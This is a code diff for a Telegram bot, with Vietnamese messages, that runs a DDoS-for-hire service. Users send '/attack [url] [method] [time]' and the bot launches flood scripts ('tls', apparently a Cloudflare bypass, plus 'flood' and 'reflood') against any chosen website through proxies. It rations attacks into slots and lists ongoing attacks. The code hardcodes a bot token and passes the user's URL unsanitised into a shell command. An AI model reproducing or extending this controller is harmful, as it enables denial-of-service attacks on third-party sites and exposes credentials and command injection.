@@ -1,18 +1,23 @@
 const TelegramBot = require('node-telegram-bot-api');
 const Database = require('better-sqlite3');
 const token = '7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc';
-const bot = new TelegramBot(token, {polling: true});
+const bot = new TelegramBot(token, { polling: true });
 const admins = [6601930239, 1848131455];
 const groupId = -1002370415846;
-const methods = ['tls', 'flood'];
+const methods = ['tls', 'flood', 'reflood'];
 const db = Database('bot.db');
 db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
-CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);`);
+CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
+CREATE TABLE IF NOT EXISTS slots (userId INTEGER, url TEXT, method TEXT, endTime INTEGER, PRIMARY KEY(userId, url, method));`);
 const getSetting = db.prepare('SELECT value FROM settings WHERE key=?');
 const setSetting = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
 const getAllBlacklist = db.prepare('SELECT keyword FROM blacklist');
 const addBlacklist = db.prepare('INSERT OR IGNORE INTO blacklist (keyword) VALUES (?)');
 const removeBlacklist = db.prepare('DELETE FROM blacklist WHERE keyword=?');
+const getAllSlots = db.prepare('SELECT * FROM slots');
+const addSlot = db.prepare('INSERT INTO slots (userId, url, method, endTime) VALUES (?, ?, ?, ?)');
+const removeSlot = db.prepare('DELETE FROM slots WHERE userId=? AND url=? AND method=?');
+const removeExpiredSlots = db.prepare('DELETE FROM slots WHERE endTime <= ?');
 if (!getSetting.get('maintenance')) setSetting.run('maintenance', 'false');
 if (!getSetting.get('activeSlots')) setSetting.run('activeSlots', '0');
 setSetting.run('activeSlots', '0');
@@ -20,85 +25,148 @@ let maintenance = getSetting.get('maintenance').value === 'true';
 let blacklist = getAllBlacklist.all().map(r => r.keyword);
 let activeSlots = parseInt(getSetting.get('activeSlots').value);
 const maxSlots = 2;
+
+function syncSlotsFromDb() {
+  removeExpiredSlots.run(Math.floor(Date.now() / 1000));
+  activeSlots = getAllSlots.all().length;
+  setSetting.run('activeSlots', activeSlots.toString());
+}
+syncSlotsFromDb();
+
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
-  bot.sendMessage(chatId, 'Menu: /methods, /attack, /blacklist, /maintenance (admin)');
+  bot.sendMessage(chatId, `*📜 Lệnh của Bot:*\n• /methods -> Xem danh sách methods\n• /attack [url] [method] [time]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Bật hoặc tắt chức năng bảo trì Bot (admin only)\n• /ongoing -> Xem slot đang hoạt động`, { parse_mode: "Markdown" });
 });
+
 bot.onText(/\/methods/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
-  bot.sendMessage(chatId, 'Methods: tls, flood');
+  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Sent Cloudflare\n• flood -> Bản v1, requests ổn\n• reflood -> Bản v2, nhiều ip hơn v1`, { parse_mode: "Markdown" });
 });
+
+bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
+  const bl = getAllBlacklist.all().map(r => r.keyword);
+  bot.sendMessage(chatId, `📝 Blacklist hiện tại:\n${bl.length ? bl.map(k=>`- \`${k}\``).join('\n') : 'Không có keyword nào.'}`, { parse_mode: "Markdown" });
+});
+
 bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
-  if (!admins.includes(userId)) return;
+  if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
   const action = match[1];
   const keyword = match[2].trim();
   if (action === 'add') {
     if (!blacklist.includes(keyword)) {
       blacklist.push(keyword);
       addBlacklist.run(keyword);
+      bot.sendMessage(chatId, `✅ Đã thêm \`${keyword}\` vào blacklist`, { parse_mode: "Markdown" });
+    } else {
+      bot.sendMessage(chatId, `Từ khóa \`${keyword}\` đã có trong blacklist.`, { parse_mode: "Markdown" });
     }
-    bot.sendMessage(chatId, `Added ${keyword} to blacklist`);
   } else if (action === 'remove') {
-    blacklist = blacklist.filter(k => k !== keyword);
-    removeBlacklist.run(keyword);
-    bot.sendMessage(chatId, `Removed ${keyword} from blacklist`);
+    if (blacklist.includes(keyword)) {
+      blacklist = blacklist.filter(k => k !== keyword);
+      removeBlacklist.run(keyword);
+      bot.sendMessage(chatId, `🚫 Đã xoá \`${keyword}\` khỏi blacklist`, { parse_mode: "Markdown" });
+    } else {
+      bot.sendMessage(chatId, `Từ khóa \`${keyword}\` không có trong blacklist.`, { parse_mode: "Markdown" });
+    }
   }
 });
+
 bot.onText(/\/maintenance/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
-  if (!admins.includes(userId)) return;
+  if (!admins.includes(userId)) return bot.sendMessage(chatId, 'Bạn không có quyền sử dụng lệnh này.');
   maintenance = !maintenance;
   setSetting.run('maintenance', maintenance ? 'true' : 'false');
-  bot.sendMessage(chatId, `Maintenance: ${maintenance ? 'ON' : 'OFF'}`);
+  bot.sendMessage(chatId, `🛠️ Bảo trì: *${maintenance ? 'Bật' : 'Tắt'}*`, { parse_mode: "Markdown" });
 });
-bot.onText(/\/attack (.+) (tls|flood) (\d+)/, (msg, match) => {
+
+bot.onText(/\/ongoing/, (msg) => {
+  syncSlotsFromDb();
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  if (!isAllowed(chatId, userId)) return;
+  const now = Math.floor(Date.now()/1000);
+  const slots = getAllSlots.all();
+  if (!slots.length) {
+    bot.sendMessage(chatId, `Hiện không có slot nào đang hoạt động.\nSố slot trống: ${maxSlots}/${maxSlots}`, { parse_mode: "Markdown" });
+    return;
+  }
+  let text = `*Ongoing Attacks:*\n`;
+  slots.forEach((s, i) => {
+    let timeLeft = s.endTime - now;
+    timeLeft = timeLeft > 0 ? timeLeft : 0;
+    text += `\n${i+1}. 👤 User: \`${s.userId}\`\n   🔗 URL: \`${s.url}\`\n   ⚙️ Method: \`${s.method}\`\n   ⏳ Còn lại: \`${timeLeft}s\``;
+  });
+  text += `\n\nSlot trống: ${maxSlots-slots.length}/${maxSlots}`;
+  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
+});
+
+bot.onText(/\/attack$/, (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  if (!isAllowed(chatId, userId)) return;
+  bot.sendMessage(chatId, 'Cú pháp: /attack [url] [method] [time]\nVD: /attack https://abc.com tls 30', { parse_mode: "Markdown" });
+});
+
+bot.onText(/\/attack (.+) (tls|flood|reflood) (\d+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
   if (maintenance && !admins.includes(userId)) {
-    bot.sendMessage(chatId, 'Bot is under maintenance');
+    bot.sendMessage(chatId, '🛠️ Bot đang bảo trì, vui lòng thử lại sau.', { parse_mode: "Markdown" });
     return;
   }
   const url = match[1];
   const method = match[2];
   let time = parseInt(match[3]);
   if (!methods.includes(method)) {
-    bot.sendMessage(chatId, 'Invalid method');
+    bot.sendMessage(chatId, '🚫 Method không hợp lệ.', { parse_mode: "Markdown" });
     return;
   }
   if (blacklist.some(k => url.includes(k))) {
-    bot.sendMessage(chatId, 'URL is blacklisted');
+    bot.sendMessage(chatId, '🚫 URL này nằm trong blacklist.', { parse_mode: "Markdown" });
     return;
   }
   if (!admins.includes(userId) && time > 60) {
     time = 60;
   }
+  syncSlotsFromDb();
   if (activeSlots >= maxSlots) {
-    bot.sendMessage(chatId, 'No slots available');
+    bot.sendMessage(chatId, '🚫 Hiện không còn slot trống, vui lòng thử lại sau.', { parse_mode: "Markdown" });
     return;
   }
+  const now = Math.floor(Date.now() / 1000);
+  const endTime = now + time;
+  addSlot.run(userId, url, method, endTime);
   activeSlots++;
   setSetting.run('activeSlots', activeSlots.toString());
-  bot.sendMessage(chatId, `Attacking ${url} with ${method} for ${time}s`);
+  bot.sendMessage(chatId, `🔫 Attack sent!\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\``, { parse_mode: "Markdown" });
   const { exec } = require('child_process');
   exec(`node ${method}.js ${url} ${time} 36 6 proxy.txt`, (error, stdout, stderr) => {
-    activeSlots--;
-    setSetting.run('activeSlots', activeSlots.toString());
-    bot.sendMessage(groupId, 'A slot is now available');
+    removeSlot.run(userId, url, method);
+    syncSlotsFromDb();
+    bot.sendMessage(
+      groupId,
+      `Đã có slot mới. ✅\nSố slot hiện tại: ${activeSlots}/${maxSlots}. 🔢`,
+      { parse_mode: "Markdown" }
+    );
     if (error) {
-      bot.sendMessage(chatId, `Error: ${error.message}`);
+      bot.sendMessage(chatId, `🚫 Lỗi: \`${error.message}\``, { parse_mode: "Markdown" });
     } else {
-      bot.sendMessage(chatId, `Attack done: ${stdout}`);
+      bot.sendMessage(chatId, `✅ Hoàn thành!\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: "Markdown" });
     }
   });
 });
+
 function isAllowed(chatId, userId) {
   if (admins.includes(userId)) return true;
   if (chatId !== groupId) return false;
